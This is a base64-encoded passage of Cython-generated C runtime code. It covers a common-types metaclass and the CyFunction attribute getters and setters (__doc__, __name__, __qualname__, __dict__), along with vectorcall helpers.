BlYy0+YmFzaWNzaXplKSA8IDApIHtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gZG9uZTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBQeV9ERUNSRUYobmV3X2NhY2hlZF90eXBlKTtcbiAgICB9XG5kb25lOlxuICAgIFB5X1hERUNSRUYoYWJpX21vZHVsZSk7XG4gICAgUHlfREVDUkVGKHB5X29iamVjdF9uYW1lKTtcbiAgICBhc3NlcnQoY2FjaGVkX3R5cGUgPT0gTlVMTCB8fCBQeVR5cGVfQ2hlY2soY2FjaGVkX3R5cGUpKTtcbiAgICByZXR1cm4gKFB5VHlwZU9iamVjdCAqKSBjYWNoZWRfdHlwZTtcbmJhZDpcbiAgICBQeV9YREVDUkVGKGNhY2hlZF90eXBlKTtcbiAgICBjYWNoZWRfdHlwZSA9IE5VTEw7XG4gICAgZ290byBkb25lO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCogX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0X21vZHVsZShDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpzZWxmLCBDWVRIT05fVU5VU0VEIHZvaWQqIGNvbnRleHQpIHtcbiAgICByZXR1cm4gUHlVbmljb2RlX0Zyb21TdHJpbmcoX19QWVhfQUJJX01PRFVMRV9OQU1FKTtcbn1cbnN0YXRpYyBQeUdldFNldERlZiBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRzZXRbXSA9IHtcbiAgICB7Il9fbW9kdWxlX18iLCBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRfbW9kdWxlLCBOVUxMLCBOVUxMLCBOVUxMfSxcbiAgICB7MCwgMCwgMCwgMCwgMH1cbn07XG5zdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3Nfc2xvdHNbXSA9IHtcbiAgICB7UHlfdHBfZ2V0c2V0LCAodm9pZCAqKV9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2dldHNldH0sXG4gICAgezAsIDB9XG59O1xuc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3NwZWMgPSB7XG4gICAgX19QWVhfVFlQRV9NT0RVTEVfUFJFRklYICJfY29tbW9uX3R5cGVzX21ldGF0eXBlIixcbiAgICAwLFxuICAgIDAsXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMFxuICAgIFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRSB8XG4gICAgUHlfVFBGTEFHU19ESVNBTExPV19JTlNUQU5USUFUSU9OIHxcbiNlbmRpZlxuICAgIFB5X1RQRkxBR1NfREVGQVVMVCxcbiAgICBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zbG90c1xufTtcbnN0YXRpYyBpbnQgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfaW5pdChQeU9iamVjdCAqbW9kdWxlKSB7XG4gICAgX19weXhfbXN0YXRldHlwZSAqbXN0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobW9kdWxlKTtcbiAgICBQeU9iamVjdCAqYmFzZXMgPSBQeVR1cGxlX1BhY2soMSwgJlB5VHlwZV9UeXBlKTtcbiAgICBpZiAodW5saWtlbHkoIWJhc2VzKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlID0gX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoTlVMTCwgbW9kdWxlLCAmX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3Nfc3BlYywgYmFzZXMpO1xuICAgIFB5X0RFQ1JFRihiYXNlcyk7XG4gICAgaWYgKHVubGlrZWx5KG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlID09IE5VTEwpKSB7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlNZXRob2RfTmV3KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCkge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIodHlwKTtcbiAgICBpZiAoIXNlbGYpXG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoZnVuYyk7XG4gICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKmFyZ3NbXSA9IHtmdW5jLCBzZWxmfTtcbiAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfVmVjdG9yY2FsbChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlLCBhcmdzLCAyLCBOVUxMKTtcbiAgICB9XG4gICAgI2Vsc2VcbiAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb25PYmpBcmdzKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0NhY2hlZE1ldGhvZFR5cGUsIGZ1bmMsIHNlbGYsIE5VTEwpO1xuICAgICNlbmRpZlxuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZWxzZVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU1ldGhvZF9OZXcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdHlwKSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIodHlwKTtcbiAgICBpZiAoIXNlbGYpXG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoZnVuYyk7XG4gICAgcmV0dXJuIFB5TWV0aG9kX05ldyhmdW5jLCBzZWxmKTtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiAoQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwpXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3Rfa3coUHlPYmplY3QgKmZ1bmMsIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3KVxue1xuICAgIFB5T2JqZWN0ICpyZXMgPSBOVUxMO1xuICAgIFB5T2JqZWN0ICprd25hbWVzO1xuICAgIFB5T2JqZWN0ICoqbmV3YXJncztcbiAgICBQeU9iamVjdCAqKmt3dmFsdWVzO1xuICAgIFB5X3NzaXplX3QgaSwgcG9zO1xuICAgIHNpemVfdCBqO1xuICAgIFB5T2JqZWN0ICprZXksICp2YWx1ZTtcbiAgICB1bnNpZ25lZCBsb25nIGtleXNfYXJlX3N0cmluZ3M7XG4gICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIFB5X3NzaXplX3Qgbmt3ID0gUHlEaWN0X1NpemUoa3cpO1xuICAgIGlmICh1bmxpa2VseShua3cgPT0gLTEpKSByZXR1cm4gTlVMTDtcbiAgICAjZWxzZVxuICAgIFB5X3NzaXplX3Qgbmt3ID0gUHlEaWN0X0dFVF9TSVpFKGt3KTtcbiAgICAjZW5kaWZcbiAgICBuZXdhcmdzID0gKFB5T2JqZWN0ICoqKVB5TWVtX01hbGxvYygobmFyZ3MgKyAoc2l6ZV90KW5rdykgKiBzaXplb2YoYXJnc1swXSkpO1xuICAgIGlmICh1bmxpa2VseShuZXdhcmdzID09IE5VTEwpKSB7XG4gICAgICAgIFB5RXJyX05vTWVtb3J5KCk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBmb3IgKGogPSAwOyBqIDwgbmFyZ3M7IGorKykgbmV3YXJnc1tqXSA9IGFyZ3Nbal07XG4gICAga3duYW1lcyA9IFB5VHVwbGVfTmV3KG5rdyk7XG4gICAgaWYgKHVubGlrZWx5KGt3bmFtZXMgPT0gTlVMTCkpIHtcbiAgICAgICAgUHlNZW1fRnJlZShuZXdhcmdzKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIGt3dmFsdWVzID0gbmV3YXJncyArIG5hcmdzO1xuICAgIHBvcyA9IGkgPSAwO1xuICAgIGtleXNfYXJlX3N0cmluZ3MgPSBQeV9UUEZMQUdTX1VOSUNPREVfU1VCQ0xBU1M7XG4gICAgd2hpbGUgKFB5RGljdF9OZXh0KGt3LCAmcG9zLCAma2V5LCAmdmFsdWUpKSB7XG4gICAgICAgIGtleXNfYXJlX3N0cmluZ3MgJj1cbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgICAgIFB5VHlwZV9HZXRGbGFncyhQeV9UWVBFKGtleSkpO1xuICAgICAgICAjZWxzZVxuICAgICAgICAgICAgUHlfVFlQRShrZXkpLT50cF9mbGFncztcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIFB5X0lOQ1JFRihrZXkpO1xuICAgICAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5VHVwbGVfU2V0SXRlbShrd25hbWVzLCBpLCBrZXkpIDwgMCkpIGdvdG8gY2xlYW51cDtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgUHlUdXBsZV9TRVRfSVRFTShrd25hbWVzLCBpLCBrZXkpO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAga3d2YWx1ZXNbaV0gPSB2YWx1ZTtcbiAgICAgICAgaSsrO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoIWtleXNfYXJlX3N0cmluZ3MpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsICJrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiKTtcbiAgICAgICAgZ290byBjbGVhbnVwO1xuICAgIH1cbiAgICByZXMgPSB2YyhmdW5jLCBuZXdhcmdzLCBuYXJncywga3duYW1lcyk7XG5jbGVhbnVwOlxuICAgIFB5X0RFQ1JFRihrd25hbWVzKTtcbiAgICBmb3IgKGkgPSAwOyBpIDwgbmt3OyBpKyspXG4gICAgICAgIFB5X0RFQ1JFRihrd3ZhbHVlc1tpXSk7XG4gICAgUHlNZW1fRnJlZShuZXdhcmdzKTtcbiAgICByZXR1cm4gcmVzO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3KVxue1xuICAgIFB5X3NzaXplX3Qga3dfc2l6ZSA9XG4gICAgICAgIGxpa2VseShrdyA9PSBOVUxMKSA/XG4gICAgICAgIDAgOlxuI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICBQeURpY3RfU2l6ZShrdyk7XG4jZWxzZVxuICAgICAgICBQeURpY3RfR0VUX1NJWkUoa3cpO1xuI2VuZGlmXG4gICAgaWYgKGt3X3NpemUgPT0gMCkge1xuICAgICAgICByZXR1cm4gdmMoZnVuYywgYXJncywgbmFyZ3MsIE5VTEwpO1xuICAgIH1cbiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICBlbHNlIGlmICh1bmxpa2VseShrd19zaXplID09IC0xKSkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4jZW5kaWZcbiAgICByZXR1cm4gX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdF9rdyhmdW5jLCB2YywgYXJncywgbmFyZ3MsIGt3KTtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb25Ob01ldGhvZChQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkge1xuICAgIGlmIChfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrKGZ1bmMpKSB7XG4gICAgICAgIHJldHVybiBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5mdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jO1xuICAgIH0gZWxzZSBpZiAoUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykpIHtcbiAgICAgICAgcmV0dXJuIFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGZ1bmMpID09IChQeUNGdW5jdGlvbikgY2Z1bmM7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKSB7XG4gICAgaWYgKChQeU9iamVjdCopUHlfVFlQRShmdW5jKSA9PSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlKSB7XG4gICAgICAgIGludCByZXN1bHQ7XG4gICAgICAgIFB5T2JqZWN0ICpuZXdGdW5jID0gUHlPYmplY3RfR2V0QXR0cihmdW5jLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZnVuYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbmV3RnVuYykpIHtcbiAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7IC8vIEl0XCdzIG9ubHkgYW4gb3B0aW1pemF0aW9uLCBzbyBkb25cJ3QgdGhyb3cgYW4gZXJyb3JcbiAgICAgICAgICAgIHJldHVybiAwO1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uTm9NZXRob2QobmV3RnVuYywgY2Z1bmMpO1xuICAgICAgICBQeV9ERUNSRUYobmV3RnVuYyk7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbk5vTWV0aG9kKGZ1bmMsIGNmdW5jKTtcbn1cbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb24oUHlPYmplY3QgKmZ1bmMsIHZvaWQgKCpjZnVuYykodm9pZCkpIHtcbiAgICBpZiAoUHlNZXRob2RfQ2hlY2soZnVuYykpIHtcbiAgICAgICAgZnVuYyA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihmdW5jKTtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpID09IChQeUNGdW5jdGlvbikgY2Z1bmM7XG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooX19weXhfQ3lGdW5jdGlvbk9iamVjdCogZiwgUHlPYmplY3QqIGNsYXNzb2JqKSB7XG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChcbiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihmKSxcbiAgICAgICAgICAgICgoY2xhc3NvYmopID8gX19QeXhfTmV3UmVmKGNsYXNzb2JqKSA6IE5VTEwpKTtcbiNlbHNlXG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQoXG4gICAgICAgICgoUHlDTWV0aG9kT2JqZWN0ICopIChmKSktPm1tX2NsYXNzLFxuICAgICAgICAoUHlUeXBlT2JqZWN0KikoKGNsYXNzb2JqKSA/IF9fUHl4X05ld1JlZihjbGFzc29iaikgOiBOVUxMKSk7XG4jZW5kaWZcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9kb2NfbG9ja2VkKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKVxue1xuICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19kb2MgPT0gTlVMTCkpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIG9wLT5mdW5jX2RvYyA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX2RvY19fIik7XG4gICAgICAgIGlmICh1bmxpa2VseSghb3AtPmZ1bmNfZG9jKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgICAgICBpZiAoKChQeUNGdW5jdGlvbk9iamVjdCopb3ApLT5tX21sLT5tbF9kb2MpIHtcbiAgICAgICAgICAgIG9wLT5mdW5jX2RvYyA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKCgoUHlDRnVuY3Rpb25PYmplY3QqKW9wKS0+bV9tbC0+bWxfZG9jKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19kb2MgPT0gTlVMTCkpXG4gICAgICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeV9JTkNSRUYoUHlfTm9uZSk7XG4gICAgICAgICAgICByZXR1cm4gUHlfTm9uZTtcbiAgICAgICAgfVxuI2VuZGlmXG4gICAgfVxuICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19kb2MpO1xuICAgIHJldHVybiBvcC0+ZnVuY19kb2M7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjbG9zdXJlKSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjbG9zdXJlKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9kb2NfbG9ja2VkKG9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9kb2MoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dClcbntcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodmFsdWUgPT0gTlVMTCkge1xuICAgICAgICB2YWx1ZSA9IFB5X05vbmU7XG4gICAgfVxuICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmZ1bmNfZG9jLCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcClcbntcbiAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfbmFtZSA9PSBOVUxMKSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgb3AtPmZ1bmNfbmFtZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX25hbWVfXyIpO1xuI2Vsc2VcbiAgICAgICAgb3AtPmZ1bmNfbmFtZSA9IFB5VW5pY29kZV9JbnRlcm5Gcm9tU3RyaW5nKCgoUHlDRnVuY3Rpb25PYmplY3QqKW9wKS0+bV9tbC0+bWxfbmFtZSk7XG4jZW5kaWZcbiAgICAgICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX25hbWUgPT0gTlVMTCkpXG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgUHlfSU5DUkVGKG9wLT5mdW5jX25hbWUpO1xuICAgIHJldHVybiBvcC0+ZnVuY19uYW1lO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgUHlPYmplY3QgKnJlc3VsdCA9IE5VTEw7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZV9sb2NrZWQob3ApO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fc2V0X25hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dClcbntcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gTlVMTCB8fCAhUHlVbmljb2RlX0NoZWNrKHZhbHVlKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJfX25hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX25hbWUsIHZhbHVlKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiAwO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X3F1YWxuYW1lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgUHlfSU5DUkVGKG9wLT5mdW5jX3F1YWxuYW1lKTtcbiAgICByZXN1bHQgPSBvcC0+ZnVuY19xdWFsbmFtZTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9xdWFsbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgIl9fcXVhbG5hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX3F1YWxuYW1lLCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0X2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcClcbntcbiAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZGljdCA9PSBOVUxMKSkge1xuICAgICAgICBvcC0+ZnVuY19kaWN0ID0gUHlEaWN0X05ldygpO1xuICAgICAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZGljdCA9PSBOVUxMKSlcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfZGljdCk7XG4gICAgcmV0dXJuIG9wLT5mdW5jX2RpY3Q7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dClcbntcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RpY3RfbG9ja2VkKG9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9kaWN0KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAiZnVuY3Rpb25cJ3MgZGljdGlvbmFyeSBtYXkgbm90IGJlIGRlbGV0ZWQiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoIVB5RGljdF9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAic2V0dGluZyBmdW5jdGlvblwncyBkaWN0aW9uYXJ5IHRvIGEgbm9uLWRpY3QiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX2RpY3QsIHZhbHVlKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiAwO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2dsb2JhbHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgUHlfSU5DUkVGKG9wLT5mdW5jX2dsb2JhbHMpO1xuICAgIHJldHVybiBvcC0+ZnVuY19nbG9iYWxzO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Nsb3N1cmUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIob3ApO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIFB5X0lOQ1